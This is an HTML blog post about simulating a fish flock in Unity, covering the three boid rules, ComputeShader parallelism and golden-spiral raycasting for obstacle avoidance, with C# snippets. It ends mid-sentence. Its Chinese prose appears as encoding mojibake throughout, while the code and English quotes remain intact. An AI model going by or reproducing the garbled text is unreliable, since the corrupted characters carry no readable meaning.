        <content type="html"><![CDATA[<p>æœ€è¿‘åˆ·æ²¹ç®¡çœ‹åˆ°ä¸€ä¸ªå…³äºç”Ÿç‰©ç¾¤æ¨¡æ‹Ÿçš„Unityå°é¡¹ç›®ï¼Œå…¶ä¸­æåˆ°äº†ä½¿ç”¨ComputeShaderæ¥å®ç°å¤šçº¿ç¨‹çš„å¹¶è¡Œè®¡ç®—ï¼Œæ„Ÿè§‰å¾ˆé€‚åˆå…¥é—¨ï¼Œå°±åšäº†ä¸€äº›å°è¯•å’Œæ”¹è‰¯</p><p><img src="/images/Boid_Cover.png"></p><span id="more"></span><h1 id="Compute-Shader-and-Boid"><a href="#Compute-Shader-and-Boid" class="headerlink" title="Compute Shader and Boid"></a>Compute Shader and Boid</h1><p><img src="/images/Boid_WholeFinish.png"></p><ul><li>é¦–å…ˆï¼Œä»€ä¹ˆæ˜¯<code>ComputeShader</code>ï¼Ÿ</li></ul><blockquote><p>A <strong>Compute Shader</strong> is a Shader Stage that is used entirely for computing arbitrary information. While it can do rendering, it is generally used for tasks not <em>directly</em> related to drawing triangles and pixels.</p></blockquote><p>ç®€å•åœ°è¯´ï¼Œå°±æ˜¯ä¸€ä¸ªæŠŠä»»åŠ¡ä»CPUç§»åˆ°GPUè®¡ç®—çš„shaderå°±æ˜¯ComputeShaderã€‚å…³äºä¸ºä»€ä¹ˆè¦è¿™ä¹ˆåšï¼ŒGPUæ˜¯å–„äºå¤„ç†é«˜åº¦ç»Ÿä¸€ï¼Œé‡å¤æ€§é«˜çš„è®¡ç®—çš„ï¼Œå¯ä»¥ä¸€æ¬¡æ€§æŠŠå¤§é‡æ•°æ®å†™å…¥bufferï¼Œç„¶åè¿›è¡Œå¹¶å‘çš„è®¡ç®—ï¼Œåœ¨å®é™…è¡¨ç°ä¸­ï¼Œä½¿ç”¨äº†ComputeShaderåçš„æ€§èƒ½æå‡æ¯”çº¯C#è„šæœ¬çš„æ•ˆç‡æå‡äº†è‡³å°‘ä¸¤å€</p><p>å…·ä½“è¯´è¯´å¹¶å‘è®¡ç®—ï¼Œå…¶å®ä¹Ÿå°±æ˜¯å¤šçº¿ç¨‹ï¼ŒGPUè¿›è¡Œå¤šçº¿ç¨‹è®¡ç®—æ—¶ï¼Œä¼šç­‰åˆ°å½“å‰bufferä¸­çš„æœ€åä¸€é¡¹æ“ä½œæ‰§è¡Œå®Œæˆåå†è¿”å›ï¼Œè¿™å°±å¯¼è‡´ç±»ä¼¼çŸ­æ¿æ•ˆåº”çš„â€œé•¿æ¿æ•ˆåº”â€ï¼Œæˆ‘çš„ç²—ç•¥ç†è§£ä¸ºæ‰§è¡Œä¸€è½®è®¡ç®—çš„æ—¶é—´æ˜¯éœ€è¦æ“ä½œæ¬¡æ•°æœ€å¤šçš„ä¸€ä¸ªçº¿ç¨‹ï¼Œäºæ˜¯å¾ˆæ˜æ˜¾ï¼ŒComputeShaderä¸èƒ½ç”¨äºåˆ†æ”¯å¤šï¼Œè¿è¡Œæ—¶é—´å·®å¼‚å¤§çš„ç®—æ³•</p><ul><li>å…¶æ¬¡ï¼Œä»€ä¹ˆæ˜¯<code>Boid</code>ï¼Ÿ</li></ul><p>å¯¹äºç”Ÿç‰©ç¾¤çš„æ¨¡æ‹Ÿï¼Œæ ¹æ® <a href="http://www.cs.toronto.edu/~dt/siggraph97-course/cwr87/">è¿™ç¯‡æ–‡ç« </a>ï¼Œå¯ä»¥ç®€å•æŠŠç”Ÿç‰©ç¾¤çš„è¡Œä¸ºæŠ½è±¡ä¸ºä»¥ä¸‹ä¸‰æ¡</p><blockquote><ol><li>Collision Avoidance: avoid collisions with nearby flockmates</li><li>Velocity Matching: attempt to match velocity with nearby flockmates</li><li>Flock Centering: attempt to stay close to nearby flockmates</li></ol></blockquote><p>ä¹Ÿå°±æ˜¯ï¼šé¿å…ç¢°æ’ï¼Œé€Ÿåº¦åŒ¹é…ï¼Œä½ç½®å±…ä¸­ã€‚è¿˜æœ‰ä¸åŒçš„æŠ½è±¡æ–¹æ³•ï¼Œè¶Šç»†è‡´çš„è§„åˆ™èƒ½å¡‘é€ çš„ç¾¤ä½“å¿…ç„¶ä¹Ÿä¼šè¶Šå¤æ‚ï¼Œä½†å…¶å®åªè¦åº”ç”¨äº†è¿™ä¸‰ä¸ªè§„åˆ™ï¼Œå°±å·²ç»å¾ˆå¤Ÿçœ‹äº†</p><hr><p>æœ¬å·¥ç¨‹å°†ç¾¤è½æ˜ç¡®ä¸ºé±¼ç¾¤ï¼Œæ¥ä¸‹æ¥å°†ä¼šä»é±¼ç¾¤çš„æŠ½è±¡è§„åˆ™è¿›è¡Œå°è§„æ¨¡æ¨¡æ‹Ÿï¼Œåˆ°åº”ç”¨ComputeShaderæ¨¡æ‹Ÿå¤§è§„æ¨¡é±¼ç¾¤ï¼Œæœ€åä½¿ç”¨ShaderGraphåˆ¶ä½œé±¼çš„æ‘†åŠ¨ä»¥åŠæ°´é¢æ¥å®Œå–„æ•´ä¸ªå·¥ç¨‹ï¼Œä¸ºå…¶æ¶¦è‰²</p><blockquote><p>å…¶å®å½“çœŸçš„æ•²ä»£ç çš„æ—¶å€™ä¼šå‘ç°çº¦æŸé±¼ç¾¤çš„è§„åˆ™éƒ½éå¸¸ç®€å•ï¼Œä½†æ˜¯å¤šä¸ªä¸ªä½“æ‰€ç»„æˆçš„ç³»ç»Ÿç¡®å®å¤æ‚çš„</p></blockquote><h2 id="Getting-Start"><a href="#Getting-Start" class="headerlink" title="Getting Start"></a>Getting Start</h2><p>å› ä¸ºæˆ‘è‡ªå·±ä¹Ÿæ˜¯Unityå…¥é—¨ï¼Œå¯¹äºé‡Œé¢çš„Rigibodyä¹‹ç±»çš„å†…ç½®åŠ›å­¦ç³»ç»Ÿä¸å¤ªäº†è§£ï¼Œä¹Ÿä¸çŸ¥é“é€šå¸¸çš„å¤„ç†è¿™ç±»åŠ›å­¦é—®é¢˜çš„è§£å†³æ–¹æ¡ˆï¼Œæ°å¥½æˆ‘æ‰‹ä¸Šæ‹¿åˆ°çš„æ²¹ç®¡dalaoçš„ç¤ºä¾‹ä»£ç ç”¨çš„æ˜¯å…¬å¼æ³•ï¼Œå³å°†é€Ÿåº¦ï¼ŒåŠ é€Ÿåº¦éƒ½ä¿å­˜åœ¨å˜é‡é‡Œï¼Œæˆ‘å°±ç…§æ¬ä»–çš„åšæ³•äº†</p><p>ä¸ºäº†åæœŸçš„è°ƒå‚ä¾¿åˆ©ï¼ˆè°ƒå‚çœŸçš„æ˜¯ä¸€ä¸ªå¾ˆéº»çƒ¦çš„äº‹æƒ…ï¼‰ï¼Œæˆ‘å°†æ ¹æ®ä¸‰æ¡è§„åˆ™æ‰€äº§ç”Ÿçš„åŠ é€Ÿåº¦æ†ç»‘ä¸ºä¸€ç§ç±»å‹çš„åŠ é€Ÿåº¦ï¼Œå†å°†è§„é¿éšœç¢ç‰©çš„åŠ é€Ÿåº¦æ†ç»‘ä¸ºå¦ä¸€ç§åŠ é€Ÿåº¦ï¼Œç„¶åå¯¹æ¯ç§ç±»å‹çš„åŠ é€Ÿåº¦åˆ†åˆ«è¿›è¡Œæ›´ç»†è‡´çš„æƒé‡åˆ†é…</p><p>ä¸ºäº†ä¾¿äºç®¡ç†é±¼ç¾¤çš„è¡Œä¸ºï¼Œå°† å¤„ç†å½“å‰çš„é±¼ä¸å…¶ä»–å‰©ä½™çš„é±¼çš„ä»£ç  ä¸ é±¼è‡ªèº«Updateçš„ä»£ç  åˆ†å¼€ç¼–è¾‘æ˜¯å¾ˆé‡è¦çš„ï¼Œä¸ç®¡æ˜¯ç¼–è¾‘çš„ä¾¿åˆ©è¿˜æ˜¯è¿è¡Œçš„æ•ˆç‡ï¼Œæ¯æ¬¡æŸ¥æ‰¾å…¶ä»–é±¼çš„æ—¶å€™éƒ½<code>FindObjectsOfType&lt;Boid&gt;()</code>ä¸€ä¸ªæ–°çš„åˆ—è¡¨æ˜¯å®Œå…¨æ²¡æœ‰å¿…è¦çš„ï¼Œæ‰€ä»¥æŠŠè¿™éƒ¨åˆ†ä¸å…¶ä»–é±¼äº§ç”Ÿè”ç³»çš„ä»£ç æŠ½è±¡ä¸ºä¸€ä¸ª<code>BoidManager</code>ç±»ï¼ŒæŠŠæ›´æ–°è‡ªèº«é€Ÿåº¦ç­‰ä¿¡æ¯çš„ä»£ç æ”¾åœ¨<code>Boid</code>è‡ªå·±çš„ç±»é‡Œé¢ä½œä¸ºæˆå‘˜æ‰æ˜¯åˆç†çš„</p><ul><li><p>å…³é”®å‡½æ•°ï¼š</p><p>  <code>FindObjectsOfType&lt;Boid&gt;()</code>  æŒ‰ç±»æŸ¥æ‰¾</p><p>  <code>Awake() </code> ä¸ <code>Start()</code>  æ³¨æ„<code>Awake</code>æ–¹æ³•æ¯”<code>Start</code>å…ˆæ‰§è¡Œå°±è¡Œ</p></li></ul><img src="/images/Boid_UnityLifeCircle.webp" alt="Boid_UnityLifeCircle" style="zoom: 80%;" /><h2 id="Rules"><a href="#Rules" class="headerlink" title="Rules"></a>Rules</h2><h3 id="Collision-Avoidance"><a href="#Collision-Avoidance" class="headerlink" title="Collision Avoidance"></a>Collision Avoidance</h3><p>å½“å‰å¯¹è±¡ä¸æ¯æ¡é±¼ä½ç½®å‘é‡ä¹‹å·®å³ä¸ºåç§»é‡ï¼Œç”¨åç§»é‡çš„å•ä½å‘é‡é™¤ä»¥åç§»é‡çš„æ¨¡ä»¥è·å¾—ä¸€ä¸ªåŸºäºä½ç½®è¿œè¿‘çš„åŠ é€Ÿåº¦å³å¯</p><center><code>avoidAcceleration -= posOffest.normalized / posOffset.magnitude</code></center><h3 id="Velocity-Matching"><a href="#Velocity-Matching" class="headerlink" title="Velocity Matching"></a>Velocity Matching</h3><p>å½“å‰å¯¹è±¡ä¸æ¯æ¡é±¼æœå‘å‘é‡ä¹‹å·®å³ä¸ºåç§»é‡ï¼Œå› ä¸ºå…¶å®å®é™…è¿è¡Œä¸­é€Ÿåº¦çš„å¤§å°å·®å¼‚ä¸ä¼šå¾ˆå¤§ï¼Œé€Ÿåº¦æ–¹å‘å´ä¼šæœ‰å¾ˆå¤§å·®å¼‚ï¼Œæ‰€ä»¥åªç”¨åŒ¹é…ä¸€ä¸‹æœå‘å³å¯</p><center><code>headingAcceleration += forwardOffest</code></center><h3 id="Flock-Centering"><a href="#Flock-Centering" class="headerlink" title="Flock Centering"></a>Flock Centering</h3><p>è¿™å…¶å®å°±æ˜¯ç¬¬ä¸€æ¡è§„åˆ™å»æ‰è·ç¦»è¿œè¿‘çš„åŠ æƒ</p><h3 id="Result"><a href="#Result" class="headerlink" title="Result"></a>Result</h3><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="built_in">int</span> anoBoidIndex = <span class="number">0</span>; anoBoidIndex &lt; boids.Length; anoBoidIndex++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (boidIndex != anoBoidIndex) &#123;</span><br><span class="line">        Vector3 offest = boids[boidIndex].transform.position - boids[anoBoidIndex].transform.position;</span><br><span class="line">        <span class="built_in">float</span> sqrDis = offest.sqrMagnitude;</span><br><span class="line">        <span class="keyword">if</span> (sqrDis &lt; viewRadius * viewRadius) &#123;</span><br><span class="line">            headingAcceleration += boids[anoBoidIndex].transform.forward - boids[boidIndex].transform.forward;</span><br><span class="line">            centerAcceleration -= offest;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (sqrDis &lt; avoidRadius * avoidRadius) avoidAcceleration += offest.normalized / sqrDis;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">boids[boidIndex].acceleration = avoidAcceleration * avoidWeight + headingAcceleration * headingWeight + centerAcceleration * centerWeight;</span><br></pre></td></tr></table></figure><p>å…¶ä¸­å¼•å…¥äº†å‡ ä¸ªRadiusä½œä¸ºæ˜¯å¦å½±å“å½“å¯¹è±¡çš„é˜ˆå€¼ä»¥é™åˆ¶é±¼çš„è§†åŠ›èŒƒå›´</p><p>åº”ç”¨äº†ä¸‰ä¸ªè§„åˆ™åå¯ä»¥å¦‚ä¸‹GIFçš„æ•ˆæœ</p><p><img src="/images/Boid_Rules.gif"></p><center><small>ï¼ˆçº¢è‰²çš„é‚£æ¡æ˜¯0å·é±¼(åˆå·æœº)ï¼Œä¸ºçš„æ˜¯ä¾¿äºä»ä¸ªä½“çš„è§†è§’è§‚å¯ŸåŠ¨å‘ï¼‰</small></center><p>æˆ‘åœ¨ä¸€ä¸ªåœ†å†…åœ¨éšæœºçš„ä½ç½®ä»¥éšæœºçš„æœå‘ç”Ÿæˆäº†ä¸€äº›é±¼ï¼Œä¸éš¾å‘ç°ä»–ä»¬å¾ˆå¿«å°±ä¼šæ ¹æ®è‡ªå·±çš„ä½ç½®ä¸æœå‘å½¢æˆå‡ ä¸ªé±¼ç¾¤ï¼Œä½†è¿™äº›é±¼ç¾¤éƒ½ååˆ†ç¨³å®šï¼Œè¿™æ˜¯å› ä¸ºè™½ç„¶ä»–ä»¬å—ç¾¤èšè§„åˆ™çš„é™åˆ¶ï¼Œä½†æ²¡æœ‰ä¸€ä¸ªå¤–åŠ›æ¥ç ´åè¿™ä¸€è§„åˆ™é™åˆ¶å‡ºçš„ç¨³å®šç»“æ„ï¼Œæˆ‘ä»¬æƒ³çœ‹åˆ°çš„å¿…ç„¶ä¸æ˜¯ä¸€ä¸ªç¨³å®šç»“æ„çš„é±¼ç¾¤</p><p>å¯¹äºå¤–åŠ›ï¼Œæˆ‘ä»¬å¯ä»¥é€‰æ‹©å¢åŠ ä¸€ä¸ªé©±é€è€…æ¥è¿½èµ¶é±¼ç¾¤ï¼Œç±»ä¼¼äº <a href="www.bilibili.com/video/BV1tq4y1j7TW">è¿™ä¸ªè§†é¢‘</a>ï¼Œä¹Ÿå¯ä»¥å¢åŠ éšœç¢ç‰©æ¥é˜»æŒ¡é±¼ç¾¤ï¼Œåœ¨æ­¤ä¸ºäº†åœºæ™¯çš„å¤šæ ·æ€§ï¼Œæˆ‘é€‰æ‹©åè€…</p><h2 id="Obstacle-Avoidance"><a href="#Obstacle-Avoidance" class="headerlink" title="Obstacle Avoidance"></a>Obstacle Avoidance</h2><p>å…¶å®ä¸Šè¿°çš„é±¼ç¾¤è¡ŒåŠ¨è§„åˆ™éå¸¸ç®€å•ï¼Œä¸ç®¡æ˜¯å­—é¢ä¸Šçœ‹èµ·æ¥è¿˜æ˜¯ä»£ç ä¸Šæ•²èµ·æ¥ï¼Œè¿™ä¹Ÿä½¿å¾—åœ¨ç©ºæ—·ç¯å¢ƒä¸­çš„é±¼ç¾¤çœ‹èµ·æ¥å¾ˆæ²¡æ„æ€ï¼Œæ‰€ä»¥åŠ å…¥ä¸€ä¸ªé¿éšœçš„functionæ¥ä½¿å®ƒæ›´æœ‰è¶£å§</p><p>è¦ä½¿é±¼é¿å¼€å‰æ–¹çš„éšœç¢ç‰©ï¼Œé¦–å…ˆæƒ³åˆ°çš„ä¾¿æ˜¯<code>Physics.Raycast()</code>å°„çº¿æ£€æµ‹ï¼Œä½†æ­¤å‡½æ•°å¯¹CPUè²Œä¼¼ä¸æ€ä¹ˆå‹å¥½ï¼Œå¤§é‡è¿è¡Œæ­¤å‡½æ•°å¡æˆPPTï¼Œè€Œå•ä¸ªçš„å°„çº¿æ£€æµ‹ä¹Ÿæ˜¯æ£€æµ‹åˆ°ç‰©ä½“æ—¶å°±è¿”å›äº†ï¼Œå‡å…·æœ‰æ‰§è¡Œæ—¶é—´å…·æœ‰é«˜åº¦ä¸ç¡®å®šæ€§çš„ç‰¹å¾ï¼Œä¸é€‚å®œä½¿ç”¨ComputeShaderæ¥æé€Ÿï¼Œæ•…å”¯ä¸€çš„è§£å†³æ–¹æ¡ˆå°±æ˜¯å°½å¯èƒ½åœ°å‡å°‘å°„çº¿æ•°é‡</p><p>åœ¨ç¤ºä¾‹å·¥ç¨‹ä¸­ï¼Œè¿™ä½è€å“¥ä½¿ç”¨äº† <a href="https://stackoverflow.com/questions/9600801/evenly-distributing-n-points-on-a-sphere/44164075#44164075">è¿™ç§æ–¹æ³•</a> æ¥ä½¿ç‚¹é˜µåœ¨çƒé¢ä¸Šè¿‘ä¼¼å‡åŒ€åˆ†å¸ƒï¼Œç„¶åå¯¹æ¯ä¸ªç‚¹åšå°„çº¿æ£€æµ‹ï¼Œå¤§è‡´æ˜¯å¯¹é»„é‡‘èºçº¿åšæå¾„å¼€ä¸ªæ ¹å·ï¼Œä½¿å¾—èºçº¿ä¸Šçš„ç‚¹å‡åŒ€æ‘Šå¼€ï¼ŒBEAUTIFUL</p><p><img src="/images/Boid_DIvideSphere1.png"></p><p>è€Œä»åœ†é¢åˆ°çƒé¢ï¼ŒæŠŠæå¾„æ¢æˆÏ†å°±è¿‡æ¥äº†</p><p><img src="/images/Boid_DIvideSphere2.png"></p><p>è¡¨è¾¾å¯èƒ½ä¸å¤ªæ¸…æ¥šï¼Œä½†åªè¦åŠ¨æ‰‹è°ƒä¸€ä¸‹å‚ï¼Œæ¨¡æ‹Ÿä¸€ä¸‹èºçº¿çš„å˜åŒ–å°±å¾ˆæ˜ç™½äº†</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">const</span> <span class="built_in">int</span> numDivide = <span class="number">15</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">const</span> <span class="built_in">float</span> viewAngleRatio = <span class="number">4f</span> / <span class="number">5f</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">readonly</span> Vector3[] viewVec3;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="built_in">int</span> numViewDirections = Mathf.CeilToInt(numDivide * viewAngleRatio);</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="title">BoidHelper</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    viewVec3 = <span class="keyword">new</span> Vector3[BoidHelper.numDivide];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">float</span> goldenRatio = (<span class="number">1</span> + Mathf.Sqrt(<span class="number">5</span>)) / <span class="number">2f</span>;</span><br><span class="line">    <span class="built_in">float</span> angleIncrement = Mathf.PI * <span class="number">2</span> * goldenRatio;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; numViewDirections; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">float</span> t = (<span class="built_in">float</span>)i / numDivide;</span><br><span class="line">        <span class="built_in">float</span> inclination = Mathf.Acos(<span class="number">1</span> - <span class="number">2</span> * t);</span><br><span class="line">        <span class="built_in">float</span> azimuth = angleIncrement * i;</span><br><span class="line"></span><br><span class="line">        viewVec3[i].x = Mathf.Sin(inclination) * Mathf.Cos(azimuth);</span><br><span class="line">        viewVec3[i].y = Mathf.Sin(inclination) * Mathf.Sin(azimuth);</span><br><span class="line">        viewVec3[i].z = Mathf.Cos(inclination);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç¤ºä¾‹å·¥ç¨‹ä¸­è¿™ä½è€å“¥åº”è¯¥ä¹Ÿæ˜¯æ€•å°„çº¿å¤ªå¤šå¯¼è‡´å¡é¡¿ï¼Œæ–¹æ¡ˆæ¯”è¾ƒæš´åŠ›ï¼Œå°±æ˜¯ä»å‰æ–¹å¼€å§‹æ£€æµ‹ï¼Œä¸€æ—¦æ£€æµ‹åˆ°ç©ºæ—·å¤„å°±ç›´æ¥åŠ ä¸ªè·ç¦»çš„æƒé‡ç„¶ååº”ç”¨åˆ°åŠ é€Ÿåº¦ä¸Šå¹¶ç›´æ¥<code>break</code>æ‰å¾ªç¯äº†ï¼Œä¹Ÿå°±æ˜¯è¯´é±¼ä¼šæœç€ç¬¬ä¸€ä¸ªæ£€æµ‹åˆ°çš„ç©ºæ—·å¤„æ¸¸å»ã€‚</p><p><img src="/images/Boid_Close2Ground.png"></p><p>è¿™ä¸å…å¯¼è‡´äº†ä¸€ä¸ªé—®é¢˜ï¼Œé‚£å°±æ˜¯é±¼æœ€åä¼šå’Œéšœç¢ç‰©è¡¨é¢ç›¸åˆ‡ï¼Œç„¶åè´´ç€éšœç¢ç‰©è¡¨é¢ç§»åŠ¨ï¼Œå…ˆä¸è¯´è¿™æ ·ä¼šå¯¼è‡´åœ¨ä¸‹ä¸€æ¬¡å—åˆ°æ‰°åŠ¨æ—¶ç©¿æ¨¡çš„é—®é¢˜ï¼Œè¿™ç§æ¬¾å¼çš„é±¼ç¾¤ç®€ç›´åƒæäº†ä¸€ç¾¤å¤§è€—å­</p><p><img src="/images/Boid_StickToGround.gif"></p><p>æ‰€ä»¥æ—¢ç„¶åœ¨åœºæ™¯ä¸ä¼šå¾ˆå¤æ‚çš„æ—¶å€™ä½¿ç”¨è¿™ä¹ˆå¤šå°„çº¿å±å®æ²¡æœ‰å¿…è¦ï¼Œç»è¿‡å®é™…æµ‹è¯•ï¼Œä½¿ç”¨å‡ æ¡å°„çº¿åˆ†è¾¨ä¾§é¢ç¯å¢ƒå¹¶ä¸”ä¸<code>break</code>å°„çº¿æ£€æµ‹çš„å¾ªç¯ï¼Œä½¿é±¼å……åˆ†è®¤çŸ¥åˆ°å‘¨å›´ç¯å¢ƒï¼Œå°†æ­¤ä¸ä¸Šè¿°ç­‰åˆ†æ£€æµ‹çš„æ–¹æ³•ç»„åˆä¾¿æ˜¯ä¸€ä¸ªæ›´ä¼˜è§£ï¼Œæ­¤å¤„æˆ‘é€‰æ‹©çš„æ˜¯12æ¡å°„çº¿ï¼Œå³xyå¹³é¢ä¸Š60Â°ç­‰åˆ†ï¼Œå†åœ¨Ï†=45Â°çš„åœ†å‘¨ä¸Šä¹Ÿ60Â°ç­‰åˆ†</p><p><img src="/images/Boid_Close2GroundFix.png"></p><p>é¿éšœçš„ç›¸å…³ä»£ç å› ä¸ºä¸æ¶‰åŠå…¶ä»–é±¼ï¼Œé€‰æ‹©æŠŠä»£ç æ”¾åœ¨äº†<code>Boid</code>ç±»ä¸‹ï¼Œä½†è¿™ä¼šå¯¼è‡´è°ƒå‚çš„æ—¶å€™éœ€è¦åœ¨Unityä¸­é¢‘ç¹åˆ‡æ¢Inspectorï¼Œè§£å†³æ–¹æ¡ˆæ˜¯æŠŠå‚æ•°å…¨éƒ¨æ”¾åˆ°ä¸€ä¸ª<code>Setting</code>ç±»ä¸­ï¼Œæ­¤ç±»ç»§æ‰¿<code>ScriptableObject</code>ï¼Œè¿™æ ·ä¸ä»…è§£å†³äº†Inspectorçš„é—®é¢˜ï¼Œè¿˜ä½¿å¾—Prefabåœ¨è¢«æ‹·è´æ—¶é€šè¿‡referenceè®¿é—®æ•°æ®ï¼Œé¿å…äº†å¤šæ¬¡æ‹·è´é€ æˆçš„å†…å­˜æµªè´¹ï¼Œä¹Ÿæå‡äº†åœ¨è¿è¡Œä¸­è°ƒå‚æ—¶çš„æ•´ä½“æ€§ï¼Œè¿è¡Œä¸­è¿›è¡Œçš„è°ƒå‚ä¹Ÿå¾—ä»¥ç›´æ¥ä¿å­˜è€Œä¸ç”¨Copy Component Valuesäº†</p><h3 id="Front"><a href="#Front" class="headerlink" title="Front"></a>Front</h3><p>åœ¨è¿›è¡Œæ­£é¢é¿éšœæ—¶ï¼Œå¦‚æœæä¾›çš„å°„çº¿å°‘äº†åˆ™ä¼šä½¿å¾—é±¼çš„é€Ÿåº¦æ–¹å‘å˜åŒ–è¿‡å¤§ï¼Œä¸å¤Ÿå¹³æ»‘ï¼Œæ‰€ä»¥æ­£é¢é¿éšœç›´æ¥é‡‡ç”¨é»„é‡‘èºæ—‹æ³•åœ¨çƒé¢ä¸Šç­‰è·å–ç‚¹ï¼Œä»æ­£é¢å¼€å§‹éå†è¿™äº›ç‚¹ï¼Œä¸€æ—¦å–åˆ°ä¸€ä¸ªå¯è½¬å‘çš„èŒƒå›´å°±<code>break</code>å³å¯</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Vector3 <span class="title">AvoidObstacleDir</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; BoidHelper.numViewDirections; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        Vector3 viewDir = transform.TransformDirection(BoidHelper.viewVec3[i]);</span><br><span class="line">        Ray ray = <span class="keyword">new</span> Ray(transform.position, viewDir);</span><br><span class="line">        <span class="keyword">if</span> (!Physics.Raycast(ray, obstacleRadius, obstacleMask)) <span class="keyword">return</span> viewDir;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> Vector3.zero;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Around"><a href="#Around" class="headerlink" title="Around"></a>Around</h3><p>ç¤ºä¾‹å·¥ç¨‹ä¸­å› ä¸ºç¼ºå°‘äº†å¯¹å‘¨å›´éšœç¢ç‰©çš„æ£€æµ‹ï¼Œå¯¼è‡´äº†å¤§é‡å› ä¸ºè´´è¿‘ç‰©ä½“è¡¨é¢ç§»åŠ¨è€Œç©¿è¿‡Colliderçš„è¡Œä¸ºï¼Œæ‰€ä»¥åœ¨å‘¨å›´åŠ å…¥å°‘é‡çš„<code>Raycast</code>ï¼Œä½¿å¾—é±¼ä¹Ÿä¸ä¼šè¿‡äºé è¿‘å››å‘¨çš„éšœç¢</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Vector3 <span class="title">KeepDstWithObstDir</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    Vector3 keepDstDir = Vector3.zero;</span><br><span class="line">    <span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; circleFrac; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        Vector3 viewDir = Vector3.zero;</span><br><span class="line">        <span class="built_in">float</span> angle = i / (<span class="built_in">float</span>)circleFrac * <span class="number">2</span> *Mathf.PI;</span><br><span class="line">        viewDir.x = Mathf.Sin(angle);</span><br><span class="line">        viewDir.y = Mathf.Cos(angle);</span><br><span class="line">        viewDir = transform.TransformDirection(viewDir);</span><br><span class="line">        Ray ray = <span class="keyword">new</span> Ray(transform.position, viewDir);</span><br><span class="line">        RaycastHit hit;</span><br><span class="line">        <span class="keyword">if</span> (Physics.Raycast(ray,<span class="keyword">out</span> hit, keepDstWithObstRadius, obstacleMask)) keepDstDir -= viewDir / hit.distance;</span><br><span class="line">        <span class="comment">// cos(PI/4) is close to 0.7071</span></span><br><span class="line">        <span class="built_in">float</span> angleOffset = <span class="number">1</span> / (<span class="built_in">float</span>)circleFrac * Mathf.PI;</span><br><span class="line">        viewDir.x = Mathf.Sin(angle + angleOffset) * <span class="number">0.7071f</span>;</span><br><span class="line">        viewDir.y = Mathf.Cos(angle + angleOffset) * <span class="number">0.7071f</span>;</span><br><span class="line">        viewDir.z = <span class="number">0.7071f</span>;</span><br><span class="line">        viewDir = transform.TransformDirection(viewDir);</span><br><span class="line">        ray = <span class="keyword">new</span> Ray(transform.position, viewDir);</span><br><span class="line">        <span class="keyword">if</span> (Physics.Raycast(ray,<span class="keyword">out</span> hit, keepDstWithObstRadius, obstacleMask)) keepDstDir -= viewDir / hit.distance;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> keepDstDir.normalized;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Result-1"><a href="#Result-1" class="headerlink" title="Result"></a>Result</h3><p>è‡³æ­¤é±¼ç¾¤çš„æ¨¡æ‹Ÿå·²ç»åŸºæœ¬å®Œæˆï¼Œæ¥ä¸‹æ¥è¦åšçš„ä¾¿æ˜¯å°†<code>Rules</code>éƒ¨åˆ†çš„ä»£ç ç§»æ¤åˆ°ComputeShaderä¸­è®¡ç®—ï¼Œä»¥å‡è½»CPUçš„è´Ÿæ‹…</p><p><img src="/images/Boid_BasicResult.gif"></p><p>é™¤äº†ä½¿ç”¨éšœç¢ç‰©ç 